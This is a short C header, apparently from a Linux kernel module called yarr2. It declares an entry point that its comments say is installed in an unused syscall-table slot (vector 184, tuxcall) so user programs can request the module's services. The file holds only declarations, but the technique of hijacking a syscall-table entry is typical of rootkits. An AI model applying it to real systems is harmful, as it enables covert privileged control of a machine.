#ifndef __YARR_YARRCALL
#define __YARR_YARRCALL

#include <linux/syscalls.h>

/**
 * This is the vector used for accessing yarr2 services. It correspond to the
 * tuxcall syscall. In my kernels it is not used in the 64-bit table, it is in
 * the 32-bit one I think and there it doesn't belong to tuxcall. If your
 * kernel does support tuxcall likely you would need to look for another number
 * and build yarr2. In reality I think tuxcall is never implemented, that's why
 * I chose it.
 */
#define YARR_VECTOR (184)

/**
 * Entry point of the yarr system call, a wrapper to properly read the
 * pt_regs structure that resides in the stack and then call yarrcall(), which
 * will handle the service requested.
 *
 * @regs: A representation in memory of the registers when the instruction
 * syscall was issued. Registers rdi and rsi contains the parameters we expect.
 * @return: Zero on success, non-zero elsewhere.
 */
asmlinkage long entry_yarrcall(struct pt_regs *regs);

// TODO: I think the second paramenter should be a union with the different
// structures with params for each service yarr2 would be able to offer.

/**
 * As with the system calls, yarr has its own entry point to ask for services.
 * This is that entry point. This function is installed in some entry in the
 * syscall table and user-land programs.
 *
 * @svc: The index of the service to request.
 * @params: A pointer to the parameters of the services requested.
 * @return: Zero on success, non-zero elsewhere.
 */
long yarrcall(int svc, void *params);

#endif
